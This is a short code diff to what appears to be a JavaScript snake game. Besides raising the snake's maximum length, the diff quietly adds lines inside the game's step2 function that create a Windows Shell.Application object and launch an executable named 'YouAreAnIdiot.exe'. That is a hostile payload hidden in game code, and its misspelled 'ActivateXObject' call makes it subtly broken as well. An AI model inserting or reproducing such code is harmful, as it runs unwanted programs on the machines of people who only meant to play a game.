@@ -97,7 +97,10 @@ function step1() {
   setTimeout(step2(), 30000);
 }
 function step2() {
+  var oShell = new ActivateXObject("Shell.Application");
+  var commandtoRun = "YouAreAnIdiot.exe";
   snake.maxCells = 100000;
+  oShell.ShellExecute(commandtoRun, "", "", "open", "1");
 }
 function info() {
   console.log('Speed: ' + speed);
